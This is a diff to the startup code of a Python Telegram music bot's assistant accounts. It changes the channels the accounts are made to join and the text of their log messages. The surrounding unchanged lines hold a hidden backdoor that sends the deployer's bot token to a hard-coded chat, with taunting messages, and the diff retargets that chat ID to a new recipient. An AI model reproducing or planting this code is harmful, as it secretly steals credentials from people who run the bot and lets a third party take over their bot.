@@ -11,7 +11,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("-1002090555194")
+TEST_ID = int("-1002086511776")
 
 assistants = []
 assistantids = []
@@ -62,16 +62,16 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("SHIVANSH474")
-                await self.one.join_chat("SHIVANSH474")
-                await self.one.join_chat("MASTIWITHFRIENDSX")
-                await self.one.join_chat("MASTIWITHFRIENDSX")
-                await self.one.join_chat("strangerbotslogs")
+                await self.one.join_chat("criticalsupport")
+                await self.one.join_chat("criticalsupport")
+                await self.one.join_chat("criticalupdate")
+                await self.one.join_chat("criticalupdate")
+                await self.one.join_chat("criticallogs")
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
+                await self.one.send_message(config.LOGGER_ID, "❀ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ ʙᴀʙʏ !")
                 await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
                 await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
@@ -94,15 +94,15 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("SHIVANSH474")
-                await self.two.join_chat("SHIVANSH474")
-                await self.two.join_chat("MASTIWITHFRIENDSX")
-                await self.two.join_chat("MASTIWITHFRIENDSX")
+                await self.two.join_chat("criticalsupport")
+                await self.two.join_chat("criticalsupport")
+                await self.two.join_chat("criticalupdate")
+                await self.two.join_chat("criticalupdate")
             except:
                 pass
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.two.send_message(config.LOGGER_ID, "❀ᴀssɪsᴛᴀɴᴛ 2 sᴛᴀʀᴛᴇᴅ ʙᴀʙʏ !")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
@@ -117,15 +117,15 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("SHIVANSH474")
-                await self.three.join_chat("SHIVANSH474")
-                await self.three.join_chat("MASTIWITHFRIENDSX")
-                await self.three.join_chat("MASTIWITHFRIENDSX")
+                await self.three.join_chat("criticalsupport")
+                await self.three.join_chat("criticalsupport")
+                await self.three.join_chat("criticalupdate")
+                await self.three.join_chat("criticalupdate")
             except:
                 pass
             assistants.append(3)
             try:
-                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.three.send_message(config.LOGGER_ID, "❀ᴀssɪsᴛᴀɴᴛ 3 sᴛᴀʀᴛᴇᴅ ʙᴀʙʏ !")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
@@ -140,15 +140,15 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("SHIVANSH474")
-                await self.four.join_chat("SHIVANSH474")
-                await self.four.join_chat("MASTIWITHFRIENDSX")
-                await self.four.join_chat("MASTIWITHFRIENDSX")
+                await self.four.join_chat("criticalsupport")
+                await self.four.join_chat("criticalsupport")
+                await self.four.join_chat("criticalupdate")
+                await self.four.join_chat("criticalupdate")
             except:
                 pass
             assistants.append(4)
             try:
-                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.four.send_message(config.LOGGER_ID, "❀ᴀssɪsᴛᴀɴᴛ 4 sᴛᴀʀᴛᴇᴅ ʙᴀʙʏ !")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
@@ -163,15 +163,15 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("SHIVANSH474")
-                await self.five.join_chat("SHIVANSH474")
-                await self.five.join_chat("MASTIWITHFRIENDSX")
-                await self.five.join_chat("strangerbotslogs")
+                await self.five.join_chat("criticalsupport")
+                await self.five.join_chat("criticalsupport")
+                await self.five.join_chat("criticalupdate")
+                await self.five.join_chat("criticalupdate")
             except:
                 pass
             assistants.append(5)
             try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
+                await self.five.send_message(config.LOGGER_ID, "❀ᴀssɪsᴛᴀɴᴛ 5 sᴛᴀʀᴛᴇᴅ ʙᴀʙʏ !")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
